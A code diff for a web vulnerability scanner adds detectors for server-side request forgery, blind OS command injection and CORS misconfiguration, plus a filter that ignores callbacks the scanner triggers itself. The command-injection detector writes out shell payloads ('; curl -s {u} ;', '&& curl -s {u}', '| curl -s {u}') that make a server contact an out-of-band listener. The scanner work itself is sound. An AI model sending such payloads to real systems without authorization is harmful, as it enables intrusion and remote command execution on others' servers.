@@ -6,7 +6,26 @@ from __future__ import annotations
 import re, urllib.parse
 from .core import (Endpoint, EventBus, Finding, FindingStatus, ParamKind, Severity,
                    Evidence, Verification, Parameter, ParamLocation)
-from .http_engine import RequestEngine, RequestMutation
+from .http_engine import USER_AGENT, RequestEngine, RequestMutation
+
+
+def is_self_callback(hit: dict | None, resp, oast_url: str) -> bool:
+    """ENG-08 (live-caught by the v2.5.0 SSRF detector on fixture /vuln/redirect.php):
+    the request engine follows SAME-HOST redirects (required for auth landings and
+    crawl depth) — an open-redirect target bounces our OAST probe URL back at the
+    listener and the ENGINE ITSELF performs the fetch. That callback is scanner-
+    initiated, never target-side evidence. Two independent markers: (a) the hop is
+    recorded in THIS response's redirect_chain, (b) the fetcher's User-Agent is the
+    engine's own. Either marker disqualifies the hit — OOB evidence must come from
+    the TARGET's process, not ours."""
+    if resp is not None:
+        for h in (getattr(resp, "redirect_chain", None) or []):
+            loc = h[1] if isinstance(h, (tuple, list)) and len(h) > 1 else str(h)
+            if loc == oast_url:
+                return True
+    h0 = hit[0] if isinstance(hit, list) and hit else (hit if isinstance(hit, dict) else None)
+    ua = (h0 or {}).get("ua", "")
+    return bool(ua) and ua == USER_AGENT
 
 # ------------------------------------------------------------ Planner rules
 PLANNER_RULES = [
@@ -434,6 +453,8 @@ class XxeDetector(Detector):
                 continue
             hit = oast.poll(iid, timeout=2.0)
             if hit:
+                if is_self_callback(hit, r, oast.url(iid)):
+                    continue                    # ENG-08: scanner-initiated fetch, not the target
                 h = hit[0]
                 # Phase 52: source attribution — the callback's origin IP + UA make
                 # the evidence self-contained (live case: ginandjuice.shop fetched
@@ -452,7 +473,188 @@ class XxeDetector(Detector):
         return None
 
 
-# ------------------------------------------------------------ Passive detectors
+# ------------------------------------------------------------ DETECT-11/12 (Phase 53): OAST-channel classes
+class SsrfDetector(Detector):
+    """DETECT-11 (SSRF, server-side request forgery): params whose name or value
+    marks them as URL carriers are pointed at the OAST channel — if the SERVER
+    (not the client) fetches our URL, the callback is out-of-band proof of a
+    server-side fetch. This is the exact evidence pattern live-proven for blind
+    XXE on ginandjuice.shop (v2.4.0): response-independent confirmation.
+    Gated on an armed OAST channel (needs_oast) — without one the detector is
+    inert (response-only SSRF oracles are unreliable: a 200/latency differential
+    is ambient noise on real apps, live-observed on the noise-cycling stock
+    endpoint). Request economy: name/value-gated params only, hard probe cap."""
+    name, vuln_type = "ssrf", "ssrf"
+    severity = Severity.HIGH
+    needs_oast = True
+    URL_NAMES = {"url", "uri", "link", "href", "page", "redirect", "dest", "destination",
+                 "next", "target", "src", "source", "fetch", "callback", "return",
+                 "returnto", "continue", "domain", "site", "load", "data", "reference",
+                 "proxy", "feed", "open", "window", "image", "img", "out", "nav", "go", "u"}
+    MAX_PROBES = 12                     # deterministic budget (endpoint order is deterministic)
+    POLL_LOCAL = 0.15                   # local callbacks land synchronously, before the probe response
+
+    def __init__(self, engine, bus, strategy_store=None, oast=None):
+        super().__init__(engine, bus, strategy_store)
+        self.oast = oast
+        self._probes = 0
+
+    def _iid(self, ep, param: str, tag: str) -> str:
+        import hashlib
+        return "oob-" + hashlib.sha1(f"ssrf|{ep.url}|{param}|{tag}".encode()).hexdigest()[:12]
+
+    def candidates(self, ep: Endpoint):
+        if self.oast is None or self._probes >= self.MAX_PROBES:
+            return []
+        out = []
+        for p in ep.parameters:
+            if p.kind in (ParamKind.TOKEN, ParamKind.NUMERIC):
+                continue
+            val = (p.value or "").lower()
+            urlish = p.name.lower() in self.URL_NAMES or val.startswith(("http://", "https://", "//"))
+            if not urlish:
+                continue
+            iid = self._iid(ep, p.name, "detect")
+            out.append(RequestMutation(endpoint=ep, param_name=p.name,
+                                       param_value=self.oast.url(iid), note=f"ssrf:{iid}"))
+            self._probes += 1
+            if self._probes >= self.MAX_PROBES:
+                break
+        return out
+
+    def analyze(self, pair, resp):
+        ep, p = pair
+        if p is None or self.oast is None:
+            return None
+        iid = self._iid(ep, p.name, "detect")
+        hit = self.oast.poll(iid, timeout=(3.0 if getattr(self.oast, "channel", "") == "public-webhook" else self.POLL_LOCAL))
+        if hit:
+            if is_self_callback(hit, resp, self.oast.url(iid)):
+                return None                      # ENG-08: the scanner fetched it itself
+            h = hit[0]
+            src = h.get("ip") or "unknown"
+            ua = (h.get("ua") or "")[:60]
+            return Finding("ssrf", Severity.HIGH, ep.url, p.name, ep.method,
+                [Evidence("oob_callback",
+                          f"server fetched the attacker-supplied URL out-of-band from {src}"
+                          + (f" (ua={ua})" if ua else "") +
+                          f" (interaction {iid} via {h.get('method', 'GET')}) — SSRF: the "
+                          f"application made the request itself. recipe: param={p.name} iid={iid}",
+                          resp.request_id)],
+                status=FindingStatus.CANDIDATE)
+        return None
+
+
+class CommandInjectionDetector(Detector):
+    """DETECT-12 (blind OS command injection): shell-metacharacter variants that
+    make the server fetch our OAST URL. A callback proves code LEFT the app's
+    shell — the strongest execution evidence short of response output, and the
+    ONLY reliable one when command output never reaches the response (blind).
+    Lives on the OAST channel like DETECT-11; inert without one. Budget: first
+    MAX_PARAMS mutable params per scan, a 2-variant separator battery per param
+    (both variants share one interaction id — the battery narrows the trigger
+    context, the id stays single so polling stays cheap)."""
+    name, vuln_type = "cmdi", "command_injection"
+    severity = Severity.CRITICAL
+    needs_oast = True
+    MAX_PARAMS = 24                     # deterministic budget (mutable params precede the
+                                         # target surface in endpoint order — sized so the
+                                         # whole fixture surface stays within the budget)
+    VARIANTS = ["; curl -s {u} ;", "&& curl -s {u}"]      # separator battery
+    VERIFY_TEMPLATE = "| curl -s {u}"    # VR-11: DIFFERENT syntax + fresh id
+    POLL_LOCAL = 0.15                   # local callbacks land synchronously
+
+    def __init__(self, engine, bus, strategy_store=None, oast=None):
+        super().__init__(engine, bus, strategy_store)
+        self.oast = oast
+        self._probes = 0
+
+    def _iid(self, ep, param: str, tag: str) -> str:
+        import hashlib
+        return "oob-" + hashlib.sha1(f"cmdi|{ep.url}|{param}|{tag}".encode()).hexdigest()[:12]
+
+    def candidates(self, ep: Endpoint):
+        if self.oast is None or self._probes >= self.MAX_PARAMS:
+            return []
+        out = []
+        for p in ep.parameters:
+            if p.kind in (ParamKind.TOKEN, ParamKind.NUMERIC) or not p.name:
+                continue
+            base = p.value or "localhost"
+            if len(base) > 60:
+                base = base[:60]
+            iid = self._iid(ep, p.name, "detect")
+            for v in self.VARIANTS:
+                out.append(RequestMutation(endpoint=ep, param_name=p.name,
+                                           param_value=base + v.format(u=self.oast.url(iid)),
+                                           note=f"cmdi:{iid}"))
+            self._probes += 1
+            if self._probes >= self.MAX_PARAMS:
+                break
+        return out
+
+    def analyze(self, pair, resp):
+        ep, p = pair
+        if p is None or self.oast is None:
+            return None
+        iid = self._iid(ep, p.name, "detect")
+        hit = self.oast.poll(iid, timeout=(3.0 if getattr(self.oast, "channel", "") == "public-webhook" else self.POLL_LOCAL))
+        if hit:
+            if is_self_callback(hit, resp, self.oast.url(iid)):
+                return None                      # ENG-08: the scanner fetched it itself
+            h = hit[0]
+            src = h.get("ip") or "unknown"
+            return Finding("command_injection", Severity.CRITICAL, ep.url, p.name, ep.method,
+                [Evidence("oob_callback",
+                          f"server executed a shell fetch out-of-band from {src} "
+                          f"(interaction {iid}) — blind command injection: separator "
+                          f"battery ([';', '&&']) triggered an outbound curl. "
+                          f"recipe: param={p.name} iid={iid}",
+                          resp.request_id)],
+                status=FindingStatus.CANDIDATE)
+        return None
+
+
+class CorsDetector(Detector):
+    """DETECT-13 (CORS misconfiguration): send a cross-origin probe header; if the
+    server REFLECTS an arbitrary Origin in Access-Control-Allow-Origin WHILE
+    also allowing credentials, any origin can read authenticated responses —
+    the dangerous combination (ACAO:* without credentials is NOT reportable:
+    no credentialed access, live doctrine: zero false positives). Header-only
+    probe: one request per GET endpoint, no params needed (runs via run(ep)
+    — the generic loop is param-bound). Verification (VR-10) replays with a
+    FRESH origin value: reflection must repeat to be a finding."""
+    name, vuln_type = "cors", "cors_misconfig"
+    severity = Severity.HIGH
+    PROBE_ORIGIN = "https://sentinel-probe.example"
+    SKIP_EXT = (".css", ".js", ".png", ".jpg", ".jpeg", ".svg", ".gif", ".ico", ".woff", ".woff2", ".map")
+
+    def candidates(self, ep: Endpoint):          # not used — see run(ep)
+        return []
+
+    def run(self, ep: Endpoint) -> Finding | None:
+        if (ep.method or "GET").upper() != "GET":
+            return None
+        if ep.url.split("?")[0].lower().endswith(self.SKIP_EXT):
+            return None
+        r = self.engine.send(RequestMutation(endpoint=ep, note="cors-probe",
+                                             extra_headers={"Origin": self.PROBE_ORIGIN}))
+        if r is None or r.error:
+            return None
+        acao = (r.headers or {}).get("access-control-allow-origin", "")
+        acac = (r.headers or {}).get("access-control-allow-credentials", "")
+        if self.PROBE_ORIGIN in acao and acac.strip().lower() == "true":
+            return Finding("cors_misconfig", Severity.HIGH, ep.url, "Origin", "GET",
+                [Evidence("header_reflection",
+                          f"arbitrary Origin reflected WITH credentials: "
+                          f"Access-Control-Allow-Origin: {acao[:80]} + "
+                          f"Access-Control-Allow-Credentials: true — credentialed "
+                          f"cross-origin reads from ANY origin", r.request_id)],
+                status=FindingStatus.CANDIDATE)
+        return None
+
+
+
 SECURITY_HEADERS = ["strict-transport-security", "content-security-policy", "x-frame-options",
                     "x-content-type-options", "referrer-policy"]
 
@@ -494,4 +696,5 @@ VULN_JS_DEPS = [
 ]
 
 
-ACTIVE_DETECTORS = [SQLiDetector, XSSDetector, TraversalDetector, RedirectDetector, CrlfDetector, XxeDetector]
+ACTIVE_DETECTORS = [SQLiDetector, XSSDetector, TraversalDetector, RedirectDetector, CrlfDetector,
+                    XxeDetector, SsrfDetector, CommandInjectionDetector, CorsDetector]
